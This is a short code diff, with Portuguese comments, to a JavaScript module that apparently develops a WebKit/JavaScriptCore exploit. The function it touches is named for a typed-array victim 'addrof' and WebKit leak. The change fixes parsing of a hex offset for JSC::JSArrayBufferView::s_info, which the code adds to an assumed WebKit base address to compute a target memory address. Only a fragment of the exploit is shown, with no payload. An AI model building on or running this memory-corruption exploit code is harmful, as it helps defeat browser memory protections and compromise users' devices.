@@ -5,8 +5,9 @@
 //   em testArrayBufferVictimCrash.mjs. Isso visa evitar o construtor problemático.
 // - Isso inclui chamadas para valores literais e resultados de operações.
 // - AGORA TAMBÉM GARANTE QUE 'new AdvancedInt64(single_arg)' para valores como
-//   WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST é substituída por
-//   'AdvancedInt64.fromParts()' usando uma função auxiliar para parsing da string hexadecimal.
+//   WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST E offsets de DATA_OFFSETS
+//   são substituídos por 'AdvancedInt64.fromParts()' usando a função auxiliar
+//   'hexStringToParts' para parsing da string hexadecimal.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -253,7 +254,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         const assumed_webkit_base = AdvancedInt64.fromParts(assumed_webkit_base_parts.low, assumed_webkit_base_parts.high);
         logS3(`[ASSUNÇÃO] Usando base da WebKit assumida para teste: ${assumed_webkit_base.toString(true)}`, "warn");
 
-        const s_info_offset = AdvancedInt64.fromParts(WEBKIT_LIBRARY_INFO.DATA_OFFSETS["JSC::JSArrayBufferView::s_info"].low, WEBKIT_LIBRARY_INFO.DATA_OFFSETS["JSC::JSArrayBufferView::s_info"].high);
+        // CORREÇÃO APLICADA AQUI: Primeiro, converta a string hexadecimal do offset em partes low/high
+        const s_info_offset_parts = hexStringToParts(WEBKIT_LIBRARY_INFO.DATA_OFFSETS["JSC::JSArrayBufferView::s_info"]);
+        const s_info_offset = AdvancedInt64.fromParts(s_info_offset_parts.low, s_info_offset_parts.high);
+
         const s_info_address = assumed_webkit_base.add(s_info_offset);
         logS3(`[Etapa 1] Endereço de JSC::JSArrayBufferView::s_info (assumido): ${s_info_address.toString(true)}`, "info");
 
